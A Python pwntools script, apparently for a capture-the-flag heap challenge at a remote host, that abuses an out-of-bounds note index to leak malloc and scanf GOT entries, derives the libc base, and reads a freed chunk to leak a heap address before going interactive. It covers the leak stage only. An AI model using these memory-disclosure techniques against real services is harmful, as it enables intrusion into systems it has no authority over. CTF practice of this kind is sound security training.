#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

info("Test 1a: Leak malloc@got")
create(0, 0x20, b'test')

# notes[-14] = malloc@got @ 0x3fd0
try:
    data = view(-14)
    info(f"malloc@got data: {data[:40]}")
    if len(data) >= 6:
        addr = u64(data[:6].ljust(8, b'\x00'))
        info(f"Address: {hex(addr)}")

        # Check if it looks like a libc address
        if addr > 0x7f0000000000:
            libc.address = addr - libc.symbols['malloc']
            success(f"Libc base (from malloc): {hex(libc.address)}")
        else:
            warn(f"Doesn't look like resolved address: {hex(addr)}")
except Exception as e:
    error(f"Failed: {e}")

info("\nTest 1b: Leak scanf@got")
# notes[-16] = scanf@got @ 0x3fc0
try:
    data = view(-16)
    info(f"scanf@got data: {data[:40]}")
    if len(data) >= 6:
        addr = u64(data[:6].ljust(8, b'\x00'))
        info(f"Address: {hex(addr)}")

        if addr > 0x7f0000000000:
            # __isoc23_scanf symbol
            libc.address = addr - libc.symbols['__isoc23_scanf']
            success(f"Libc base (from scanf): {hex(libc.address)}")
        else:
            warn(f"Doesn't look like resolved: {hex(addr)}")
except Exception as e:
    error(f"Failed scanf: {e}")
    # Try just 'scanf'
    try:
        libc.address = addr - libc.symbols['scanf']
        success(f"Libc base (from scanf alt): {hex(libc.address)}")
    except:
        pass

info("\nTest 2: Leak heap")
create(1, 0x100, b'A' * 0x100)
create(2, 0x100, b'B' * 0x100)

delete(1)
delete(2)

try:
    data = view(2)
    info(f"Heap data: {data[:40]}")
    if len(data) >= 5:
        heap = u64(data[:5].ljust(8, b'\x00'))
        info(f"Heap leak: {hex(heap)}")
except Exception as e:
    error(f"Failed: {e}")

io.interactive()
